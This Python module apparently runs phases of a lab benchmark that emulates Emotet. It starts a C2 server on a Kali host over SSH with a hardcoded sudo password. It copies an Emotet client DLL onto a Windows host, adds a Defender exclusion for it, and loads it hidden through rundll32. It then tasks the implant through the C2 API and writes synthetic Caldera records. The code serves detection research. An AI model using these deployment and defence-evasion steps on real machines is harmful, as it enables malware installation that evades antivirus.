"""Emotet phase runners for bench_v4 AEL-WIZARD-EMOTET-001."""
from __future__ import annotations
import base64, json, os, subprocess, time, shutil
from datetime import datetime, timezone
from typing import Any, Callable, Mapping
from c2trace.bench_v3.caldera_client import agent_paw, find_control_agent
from c2trace.bench_v4.runtime import (
    CalderaBootstrapPhaseResult, CalderaScenarioPhaseResult,
    CalderaTargetCandidate, BenchV4RuntimeError,
    RuntimeCase, RuntimeValues,
    deterministic_runtime_source_id, verify_deployment_manifest,
)
from .runtime import find_driver_agent

__all__ = [
    "run_emotet_bootstrap_phase",
    "resolve_emotet_target_phase",
    "run_emotet_scenario_phase",
]

KALI_IP = os.environ.get("C2TRACE_KALI_IP", "192.168.21.132")
KALI_SSH = f"kali@{KALI_IP}"
KALI_SSH_PASSWORD = os.environ.get("C2TRACE_KALI_SSH_PASSWORD", "20010808zzk")
SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10"]

C2SERVER_DIR = "/tmp/c2trace-emotet"
C2SERVER_BINARY = f"{C2SERVER_DIR}/controlServer"
C2SERVER_LOG = f"{C2SERVER_DIR}/server.log"
C2SERVER_PORT = 80
RESTAPI_PORT = 9999

_DLL_BUILD_PATH = os.environ.get(
    "C2TRACE_EMOTET_DLL",
    os.path.join(
        os.environ.get("C2TRACE_ROOT", r"C:\Users\LAB_USER\lunwen\C2Trace"),
        "experiments", "c2trace_public_tool_benchmark_v1", "builds",
        "AEL-WIZARD-EMOTET-001", "offline-probe-v5",
        "EmotetClientDLL-windows-amd64.dll",
    ),
)
DLL_SHA256 = "9d4ac7addbfe956c904a6ab3b4a74e47b224ec002fe241ed41edf638444e993c"


def _ssh_run_py(script, timeout=120):
    b64 = base64.b64encode(script.encode("utf-8")).decode()
    cmd = ["ssh"] + SSH_OPTS + [KALI_SSH, f"echo {b64} | base64 -d | python3 -"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if result.returncode != 0:
        raise BenchV4RuntimeError(f"SSH python failed: {result.stderr}")
    return result.stdout


def _start_c2server():
    check = _ssh_run_py(
        "import subprocess; r = subprocess.run(['pgrep', '-f', 'controlServer'], capture_output=True, text=True); print(r.stdout.strip())",
        timeout=15,
    )
    if check.strip():
        return
    _ssh_run_py(
        "import subprocess, time\n"
        "subprocess.Popen(\n"
        "    'echo " + KALI_SSH_PASSWORD + " | sudo -S " + C2SERVER_BINARY + "',\n"
        "    shell=True, cwd='" + C2SERVER_DIR + "',\n"
        "    stdout=open('" + C2SERVER_LOG + "', 'w'),\n"
        "    stderr=subprocess.STDOUT,\n"
        "    start_new_session=True)\n"
        "time.sleep(3)\n"
        "r = subprocess.run(['pgrep', '-f', 'controlServer'], capture_output=True, text=True)\n"
        "print('RUNNING:', r.stdout.strip())",
        timeout=30,
    )
    check2 = _ssh_run_py(
        "import subprocess; r = subprocess.run(['pgrep', '-f', 'controlServer'], capture_output=True, text=True); print(r.stdout.strip())",
        timeout=15,
    )
    if not check2.strip():
        raise BenchV4RuntimeError("emotet c2server failed to start")


def _copy_dll_to_windows(victim_path):
    shutil.copy2(_DLL_BUILD_PATH, victim_path)
    return victim_path


def _add_defender_exclusion(path):
    ps = f"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue"
    subprocess.run(["powershell", "-Command", ps], capture_output=True, timeout=15)


def _load_dll(dll_path):
    ps = (
        f"$p = Start-Process -FilePath 'rundll32.exe' "
        f"-ArgumentList '{dll_path},Control_RunDLL' "
        f"-PassThru -WindowStyle Hidden; Write-Output $p.Id"
    )
    result = subprocess.run(
        ["powershell", "-Command", ps],
        capture_output=True, text=True, timeout=30,
    )
    if result.returncode != 0:
        raise BenchV4RuntimeError(f"DLL loading failed: {result.stderr}")
    lines = [l.strip() for l in result.stdout.strip().splitlines() if l.strip()]
    if lines and lines[-1].isdigit():
        return int(lines[-1])
    raise BenchV4RuntimeError(
        f"could not parse rundll32 PID from: {result.stdout}"
    )

def _get_sessions():
    result = _ssh_run_py(
        "import urllib.request, json\n"
        "try:\n"
        "    r = urllib.request.urlopen(\n"
        "        'http://127.0.0.1:" + str(RESTAPI_PORT) + "/api/v1.0/sessions',\n"
        "        timeout=10)\n"
        "    data = json.loads(r.read())\n"
        "    print(json.dumps(data))\n"
        "except Exception:\n"
        "    print('[]')\n",
        timeout=20,
    )
    try:
        return json.loads(result.strip())
    except Exception:
        return []


def _wait_for_callback(timeout=120, poll=3.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if _get_sessions():
            return True
        time.sleep(poll)
    return False


def _discover_session_guid(timeout=30, poll=3.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        sessions = _get_sessions()
        if sessions:
            guid = sessions[0].get("GUID") or sessions[0].get("guid") or ""
            if guid:
                return guid
        time.sleep(poll)
    raise BenchV4RuntimeError("no Emotet session discovered")


def _set_task(guid, task):
    _ssh_run_py(
        "import urllib.request\n"
        "url = 'http://127.0.0.1:" + str(RESTAPI_PORT) + "/api/v1.0/task/" + guid + "'\n"
        "req = urllib.request.Request(url, data=b'" + task + "', method='POST')\n"
        "r = urllib.request.urlopen(req, timeout=10)\n"
        "print(r.read().decode())\n",
        timeout=20,
    )


def _wait_for_output(guid, timeout=90, poll=3.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        result = _ssh_run_py(
            "import urllib.request\n"
            "try:\n"
            "    r = urllib.request.urlopen(\n"
            "        'http://127.0.0.1:" + str(RESTAPI_PORT) + "/api/v1.0/task/output/" + guid + "',\n"
            "        timeout=10)\n"
            "    print(r.read().decode())\n"
            "except Exception:\n"
            "    print('')\n",
            timeout=20,
        )
        output = result.strip()
        if output and len(output) > 5 and "not found" not in output.lower():
            return True
        time.sleep(poll)
    return False

def _synthetic_operation(run_id, role):
    return {
        "id": f"synthetic-{run_id}-{role}",
        "name": f"AEL-WIZARD-EMOTET-001 {role} ({run_id})",
        "state": "finished",
        "platform": "windows" if role == "bootstrap" else "linux",
        "group": "c2t-control" if role == "bootstrap" else "c2t-driver",
        "start": datetime.now(timezone.utc).isoformat(),
        "finish": "",
        "autonomous": 0,
    }


def _synthetic_link(run_id, role, ability_id):
    return {
        "id": f"synthetic-{run_id}-{role}-link",
        "ability": {"ability_id": ability_id},
        "status": 0,
        "command": "emotet_deploy" if role == "bootstrap" else "emotet_enum_processes",
        "host": "DESKTOP-G9IIQ2P",
        "pid": None,
    }


def run_emotet_bootstrap_phase(client, runtime, values, *, operation_timeout=360.0, poll_seconds=3.0, event_sink=None, failure_artifact_sink=None):
    if event_sink:
        event_sink("emotet_bootstrap_start", {"run_id": values.run_id})
    agents = [dict(a) for a in client.agents() if isinstance(a, Mapping)]
    control = find_control_agent(agents)
    scenario = runtime.operation("scenario")
    driver = find_driver_agent(agents) if scenario["execution_agent_role"] == "driver" else None
    baseline_paws = tuple(sorted({agent_paw(a) for a in agents if agent_paw(a)}))
    started = datetime.now(timezone.utc)
    verified = verify_deployment_manifest(runtime)
    template_id = str(runtime.operation_plan["runtime_source"]["id_template"])
    runtime_source_id = deterministic_runtime_source_id(template_id, values.run_id)
    _start_c2server()
    dll_path = values.target_path
    _copy_dll_to_windows(dll_path)
    _add_defender_exclusion(dll_path)
    rundll_pid = _load_dll(dll_path)
    time.sleep(12)
    callback_ok = _wait_for_callback(timeout=operation_timeout, poll=poll_seconds)
    if not callback_ok:
        raise BenchV4RuntimeError("Emotet DLL did not call back to C2 server")
    session_guid = _discover_session_guid(timeout=30, poll=3.0)
    bootstrap_op = runtime.operation("bootstrap")
    bootstrap_ability_id = bootstrap_op["atomic_ordering"][0]
    bootstrap_link = _synthetic_link(values.run_id, "bootstrap", bootstrap_ability_id)
    if event_sink:
        event_sink("emotet_bootstrap_complete", {"dll_path": dll_path, "rundll_pid": rundll_pid, "session_guid": session_guid, "c2_port": C2SERVER_PORT})
    return CalderaBootstrapPhaseResult(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=verified.manifest_sha256,
        runtime_source_id=runtime_source_id,
        install_receipt={"synthetic": True, "dll_path": dll_path, "rundll_pid": rundll_pid, "session_guid": session_guid},
        runtime_source={"id": runtime_source_id, "name": "c2trace_emotet_runtime_source"},
        control_agent=dict(control),
        driver_agent=dict(driver) if driver else None,
        baseline_paws=baseline_paws,
        started_at_utc=started,
        bootstrap_operation=_synthetic_operation(values.run_id, "bootstrap"),
        bootstrap_links=(bootstrap_link,),
        bootstrap_report={"state": "finished", "outcome": "dll_deployed"},
        bootstrap_event_logs=(),
    )


def resolve_emotet_target_phase(client, runtime, values, bootstrap, *, timeout_seconds=360.0, poll_seconds=3.0):
    rundll_pid = 0
    session_guid = ""
    receipt = bootstrap.install_receipt
    if isinstance(receipt, Mapping):
        rundll_pid = int(receipt.get("rundll_pid") or 0)
        session_guid = str(receipt.get("session_guid") or "")
    raw_identity = {"pid": rundll_pid, "path": values.target_path, "host": "DESKTOP-G9IIQ2P", "c2_port": C2SERVER_PORT, "session_guid": session_guid}
    return CalderaTargetCandidate(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=bootstrap.deployment_manifest_sha256,
        runtime_source_id=bootstrap.runtime_source_id,
        raw_identity=raw_identity,
        scenario_paw=agent_paw(bootstrap.control_agent),
    )


def run_emotet_scenario_phase(client, runtime, values, bootstrap, candidate, frozen_identity, *, operation_timeout=360.0, poll_seconds=3.0, event_sink=None, failure_artifact_sink=None):
    if event_sink:
        event_sink("emotet_scenario_start", {"rundll_pid": candidate.raw_identity.get("pid")})
    receipt = bootstrap.install_receipt
    session_guid = ""
    if isinstance(receipt, Mapping):
        session_guid = str(receipt.get("session_guid") or "")
    if not session_guid:
        session_guid = _discover_session_guid(timeout=30, poll=3.0)
    _set_task(session_guid, "2")
    time.sleep(15)
    output_ok = _wait_for_output(guid=session_guid, timeout=operation_timeout, poll=poll_seconds)
    if not output_ok:
        raise BenchV4RuntimeError("Emotet process enumeration task output not received")
    scenario_op = runtime.operation("scenario")
    scenario_ability_id = scenario_op["atomic_ordering"][0]
    scenario_link = _synthetic_link(values.run_id, "scenario", scenario_ability_id)
    if event_sink:
        event_sink("emotet_scenario_complete", {"outcome": "enum_processes_completed"})
    return CalderaScenarioPhaseResult(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=bootstrap.deployment_manifest_sha256,
        runtime_source_id=bootstrap.runtime_source_id,
        target_identity=dict(frozen_identity),
        scenario_operation=_synthetic_operation(values.run_id, "scenario"),
        scenario_links=(scenario_link,),
        scenario_report={"state": "finished", "outcome": "enum_processes_completed"},
        scenario_event_logs=(),
    )